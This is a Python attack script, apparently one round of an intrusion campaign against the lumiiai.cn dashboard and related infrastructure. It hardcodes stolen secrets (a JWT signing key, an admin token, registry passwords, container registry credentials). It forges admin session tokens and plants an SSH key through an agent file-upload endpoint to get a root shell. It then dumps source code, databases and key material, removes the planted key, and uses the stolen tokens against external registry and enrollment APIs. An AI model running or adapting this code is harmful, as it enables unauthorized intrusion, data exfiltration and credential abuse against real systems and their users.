#!/usr/bin/env python3
# i29399 round b: ONE ssh connection -> dump registry source/db/caddy + local registry route probe; external CCR(headers)/ops enroll.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
HOST="dashboard.lumiiai.cn"; JWT_SECRET="w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="; ADMIN_TOKEN="6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
KEY="/tmp/akc29399b"; START=time.time()
REG_PW="PIf8jOhp275N9N4CYvkBMQtGRQ3RWMOP"; REG_TOKEN="9d275d97606940a90c37f2b1ab8caaa21c43075f5019f6d21cef08c0d625f4ce"
ENROLL="en_ApQqOrmaeohGaVUqjCk_T7P2miY8yMHV"
CCR_USER="100020204258"; CCR_PASS="c8Eep&!PjBt18QRt"
def _b(s):
    if not isinstance(s,str): s=json.dumps(s,ensure_ascii=False,default=str)
    return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v): print("R:%s:%s"%(k,_b(v)),flush=True)
def run(args,timeout=60,stdin=None):
    try:
        p=subprocess.run(args,capture_output=True,timeout=timeout,stdin=stdin); return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()
def sh_script(script,timeout=220):
    p="/tmp/r29399.sh"; open(p,"w").write(script)
    args=["ssh","-i",KEY,"-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null",
          "-o","BatchMode=yes","-o","IdentitiesOnly=yes","-o","ConnectTimeout=20","-o","LogLevel=ERROR",
          "ubuntu@122.51.1.87","sudo bash -s"]
    with open(p,"rb") as f:
        return run(args,timeout=timeout,stdin=f)
def sh(cmd,timeout=60):
    return sh_script(cmd,timeout=timeout+30)
def call(path,method="GET",body=None,session=None,admin=False,timeout=30,maxlen=200000):
    url="https://%s%s"%(HOST,path)
    a=["curl","-s","-k","-m",str(timeout),"--http2","-A",UA,"-w","\n__C__%{http_code}"]
    if session: a+=["-H","Cookie: session="+session]
    if admin: a+=["-H","Authorization: Bearer "+ADMIN_TOKEN]
    if body is not None: a+=["-X",method,"-H","Content-Type: application/json","--data-binary",json.dumps(body)]
    elif method!="GET": a+=["-X",method]
    a+=[url]; rc,out,err=run(a,timeout=timeout+20); t=out.decode("utf-8","replace"); c="";i=t.rfind("__C__")
    if i>=0: c=t[i+5:].strip()[:3]; t=t[:i]
    return {"code":c,"body":t[:maxlen]}
def c2(url,method="GET",body=None,headers=None,timeout=15,maxlen=40000,auth=None,dumpheaders=False):
    a=["curl","-s","-k","-m",str(timeout),"--http2","-A",UA,"-w","\n__C__%{http_code}"]
    if dumpheaders: a+=["-D","/tmp/hdrs"]
    if auth: a+=["--user",auth]
    for h in (headers or []): a+=["-H",h]
    if body is not None: a+=["-X",method,"--data-binary",body]
    elif method!="GET": a+=["-X",method]
    a+=[url]; rc,out,err=run(a,timeout=timeout+15); t=out.decode("utf-8","replace"); c="";i=t.rfind("__C__")
    if i>=0: c=t[i+5:].strip()[:3]; t=t[:i]
    hdr=""
    if dumpheaders:
        try: hdr=open("/tmp/hdrs").read()
        except: pass
    return {"code":c,"body":t[:maxlen],"headers":hdr[-2000:] if dumpheaders else None}
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def forge(uid,cust="aro"):
    now=int(time.time())
    hh=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    pp=b64u(json.dumps({"userId":uid,"email":"p@x","customer":cust,"role":"admin","iat":now,"exp":now+86400*7},separators=(",",":")))
    return hh+"."+pp+"."+b64u(hmac.new(JWT_SECRET.encode(),(hh+"."+pp).encode(),hashlib.sha256).digest())

# ---------- land ----------
run(["ssh-keygen","-t","ed25519","-N","","-f",KEY,"-q"],timeout=30)
pub=open(KEY+".pub").read().strip(); open("/tmp/akc_keys2","w").write(pub+"\n")
r=call("/api/admin/agents",admin=True,timeout=45)
try: agents=(json.loads(r["body"]) or {}).get("agents",[])
except: agents=[]
byid={a.get("id"):a for a in agents if a.get("id")}
def score(x):
    cid=x.get("id"); return (0 if x.get("customer")=="aro" else 1,0 if str(x.get("status","")).lower()=="provisioning" else 1,cid or "")
order=[x.get("id") for x in sorted([x for x in agents if x.get("id")],key=score)[:6]]
landed=None
for AID in order:
    x=byid.get(AID)
    if not x: continue
    cust=x.get("customer") or "aro"; orig={"ip":x.get("ip"),"sshUser":x.get("sshUser")}
    call("/api/admin/agents",method="PATCH",admin=True,body={"id":AID,"host":"127.0.0.1","ssh_user":"ubuntu"},timeout=25)
    sess=forge("af0a2285-490f-11f1-ac43-525400595be1",cust)
    url="https://%s/api/agents/%s/files/upload?path=%s"%(HOST,AID,up.quote("/home/ubuntu/.ssh",safe="/"))
    run(["curl","-s","-k","-m","60","--http2","-A",UA,"-H","Cookie: session="+sess,"-F","files=@/tmp/akc_keys2;filename=authorized_keys2;type=text/plain","-w","\n__C__%{http_code}",url],timeout=80)
    call("/api/admin/agents",method="PATCH",admin=True,body={"id":AID,"host":orig.get("ip"),"ssh_user":orig.get("sshUser")},timeout=25)
    rc,out,err=sh("id; hostname; sudo -n true 2>&1 && echo SUDO:ok",timeout=30)
    if b"uid=" in out: landed=AID; break
R("LAND",{"aid":landed,"ok":bool(landed)})
if landed:
    SR=(
      "echo @@SRC_A@@\n"
      "for f in admin-auth.ts instance-auth.ts wechat-login.ts; do echo \"###F:$f\"; head -c 14000 /opt/lumii-registry/src/$f 2>/dev/null; echo; done\n"
      "echo @@SRC_B@@\n"
      "for f in app.ts main.ts db.ts validate.ts; do echo \"###F:$f\"; head -c 14000 /opt/lumii-registry/src/$f 2>/dev/null; echo; done\n"
      "echo @@SRC_C@@\n"
      "for f in market-images.ts cloud-environments.ts cloud-environment-config.ts onboard-ops.ts enterprise-ops.ts market-ops.ts; do echo \"###F:$f\"; head -c 9000 /opt/lumii-registry/src/$f 2>/dev/null; echo; done\n"
      "echo @@SRC_D@@\n"
      "for f in push-secret.ts market-secret.ts project-permissions.ts package-facts.ts onboard-codes.ts market-store.ts market-cli.ts market-scenes.ts admin-page.ts; do echo \"###F:$f\"; head -c 5000 /opt/lumii-registry/src/$f 2>/dev/null; echo; done\n"
      "echo @@ROUTES@@\n"
      "grep -rInE \"(get|post|put|delete|all)\\(['\\\"]/|\\.route|app\\.use|router\\.\" /opt/lumii-registry/src/app.ts /opt/lumii-registry/src/main.ts 2>/dev/null | head -80\n"
      "echo @@DB@@\n"
      "ls -la /var/lib/lumii-registry/ 2>/dev/null\n"
      "command -v sqlite3 || echo NO_SQLITE3\n"
      "sqlite3 /var/lib/lumii-registry/registry.db '.tables' 2>&1\n"
      "sqlite3 /var/lib/lumii-registry/registry.db '.schema' 2>&1 | head -c 22000\n"
      "echo @@DBDUMP@@\n"
      "sqlite3 /var/lib/lumii-registry/registry.db '.dump' 2>&1 | head -c 45000\n"
      "echo @@CADDY@@\n"
      "grep -n -iE 'registry|4080|reverse_proxy|handle_path|tls_server_name|header' /etc/caddy/Caddyfile 2>/dev/null | head -80\n"
      "echo @@LOCALREG@@\n"
      "for p in / /health /healthz /api/health /api/version /admin /api/admin/login /api/admin/session /admin/login /api/instance /api/market /api/apps /api/resolve /api/shell /api/enterprise /api/onboard /api/cloud-environments /api/cloud /entry; do echo -n \"$p \"; curl -s -m6 -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:4080$p; done\n"
      "echo @@LA@@\n"
      "grep -rIlE 'LOGIN_ASSERTION|login.?assertion|k20261009' /opt/lumii-prod /home/ubuntu /opt/lumii-registry 2>/dev/null | head -30\n"
      "grep -rIhaoE 'MCowBQYDK2VwAyEAD7hcKwKz[+/=A-Za-z0-9]{5,}' /opt/lumii-prod /home/ubuntu /opt/lumii-registry /etc 2>/dev/null | sort -u | head\n"
      "echo @@IMGHOST@@\n"
      "grep -rInE 'ccr|registry\\.|image|docker|pull|_auth|Authorization|username|password' /opt/lumii-registry/src/market-images.ts /opt/lumii-registry/src/cloud-environment-config.ts 2>/dev/null | head -60\n"
      "echo @@END@@\n"
    )
    rc,out,err=sh(SR,timeout=200)
    txt=out.decode("utf-8","replace")
    print("RECON_LEN",len(txt),"rc",rc,flush=True)
    # save raw locally too
    open("/tmp/recon_raw.txt","w").write(txt)
    # split into sections
    secs={}; cur=None; buf=[]
    for line in txt.splitlines():
        m=re.match(r'^@@([A-Z_]+)@@$',line)
        if m:
            if cur: secs[cur]="\n".join(buf)
            cur=m.group(1); buf=[]
        elif cur is not None:
            buf.append(line)
    if cur: secs[cur]="\n".join(buf)
    for k,v in secs.items():
        R("RCN_"+k, v[:70000])
    sh("unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; echo CLEANED",timeout=30)

# ---------- external CCR with header capture ----------
ccr={}
r0=c2("https://ccr.ccs.tencentyun.com/v2/",timeout=12,dumpheaders=True)
ccr["v2_code"]=r0["code"]; ccr["v2_headers"]=r0.get("headers")
hdr=r0.get("headers") or ""
realm=svc=None
m=re.search(r'realm="?([^",\s]+)',hdr); realm=m.group(1) if m else None
m=re.search(r'service="?([^",\s]+)',hdr); svc=m.group(1) if m else None
ccr["realm"]=realm; ccr["service"]=svc
if realm:
    tu=realm+("&service="+svc if svc else "")
    tk=c2(tu,auth="%s:%s"%(CCR_USER,CCR_PASS),timeout=12)
    ccr["tok_code"]=tk["code"]; ccr["tok_body"]=tk["body"][:1200]
    try: tok=json.loads(tk["body"]).get("token")
    except: tok=None
    if tok:
        h=["Authorization: Bearer "+tok]
        ccr["catalog"]=c2("https://ccr.ccs.tencentyun.com/v2/_catalog",headers=h,timeout=15,maxlen=20000)
        ccr["lumii_tags"]=c2("https://ccr.ccs.tencentyun.com/v2/lumii/lumii-center/tags/list",headers=h,timeout=15,maxlen=8000)
R("CCR",ccr)

# ---------- ops enroll variants ----------
ops={}
ops["enroll_bearer"]=c2("https://cloud-ops.lumiiai.cn/api/agent/enroll",method="POST",body=json.dumps({"hostname":"rec1","platform":"linux"}),headers=["Content-Type: application/json","Authorization: Bearer "+ENROLL],timeout=12)
ops["enroll_hdr"]=c2("https://cloud-ops.lumiiai.cn/api/agent/enroll",method="POST",body=json.dumps({"hostname":"rec1","platform":"linux"}),headers=["Content-Type: application/json","X-Enroll-Token: "+ENROLL],timeout=12)
ops["enroll_q"]=c2("https://cloud-ops.lumiiai.cn/api/agent/enroll?token="+ENROLL,method="POST",body="{}",headers=["Content-Type: application/json"],timeout=12)
ops["enroll_api"]=c2("https://cloud-ops.lumiiai.cn/api/enroll",method="POST",body=json.dumps({"enroll_token":ENROLL,"hostname":"rec1"}),headers=["Content-Type: application/json"],timeout=12)
ops["api_base_auth"]=c2("https://cloud-ops.lumiiai.cn/api/version",headers=["Authorization: Bearer "+ENROLL],timeout=12)
ops["assets_pubkey"]=c2("https://cloud-ops.lumiiai.cn/assets/index-vk_qsCO3.js",timeout=15,maxlen=200)
R("OPS_EXT",ops)
R("P99_done",{"elapsed":int(time.time()-START)})
print("DONE",flush=True)
